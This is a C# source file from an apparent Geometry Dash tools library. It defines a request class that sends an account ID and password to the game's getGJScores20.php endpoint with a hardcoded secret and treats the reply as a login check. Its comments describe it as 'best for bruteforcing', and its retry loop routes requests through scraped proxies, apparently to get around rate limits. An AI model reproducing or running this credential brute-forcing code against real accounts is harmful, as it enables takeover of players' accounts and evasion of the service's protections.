using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GDTools.Core.Boomlings_Networking {

    /// <summary>
    /// Accepts accountID and GJP (password), responds local leaderboards else -1 if the login is incorrect. 
    /// Best for bruteforcing.
    /// </summary>
    public class Get_GJ_Scores_20 : Boomlings_Request_Base {
        private int accountID;

        /// <summary>
        /// Generates new Get_GJ_Scores_20 instance.
        /// </summary>
        /// <param name="accountID">Account ID</param>
        /// <param name="password">The raw password, not the GJP.</param>
        public Get_GJ_Scores_20(int accountID, string password) : base("/database/getGJScores20.php",
            $"gameVersion=21&binaryVersion=35&gdw=0&accountID={accountID}&gjp={Utilities.Robcryptions.PasswordToGJP(password)}&type=friends&count=100&secret=Wmfd2893gb7") {
            this.accountID = accountID;
        }

        public async Task<(bool IsSuccess, string Response)> GetScores(ProxyType proxyToUse = ProxyType.ScrapedProxy) {
            bool success = false;
            const string innerSeparator = ":";
            string serverResponse = string.Empty;

            // keep bruteforcing until there's a valid response
            while (!serverResponse.Contains(innerSeparator) && !serverResponse.Contains("-1")) {
                serverResponse = await SendAsync(proxyToUse);
                // the string is null or whitespace then proxi fucked up
                if (serverResponse == null) serverResponse = string.Empty;
                if (string.IsNullOrWhiteSpace(serverResponse)) continue;

                success = serverResponse.Contains(innerSeparator);
            }

            Debug.WriteLine($"Get GJ Scores for {accountID} Response {serverResponse} Is Success {success}");

            return (success, serverResponse);
        }

    }
}
